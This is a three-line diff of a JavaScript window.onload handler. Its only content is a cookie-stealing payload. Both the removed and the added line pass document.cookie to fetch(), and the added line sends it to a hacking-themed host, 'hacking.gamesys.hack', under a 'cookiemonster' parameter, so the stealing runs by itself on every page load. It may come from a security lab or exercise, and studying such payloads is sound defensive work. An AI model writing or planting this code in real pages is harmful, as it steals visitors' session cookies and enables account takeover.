@@ -1,3 +1,3 @@
 window.onload = function() {
-    fetch('http://example.com/movies.json?cookiemonster='+this.encodeURI(document.cookie))
+    fetch('http://hacking.gamesys.hack/hacks.json?cookiemonster='+this.encodeURI(document.cookie))
 }
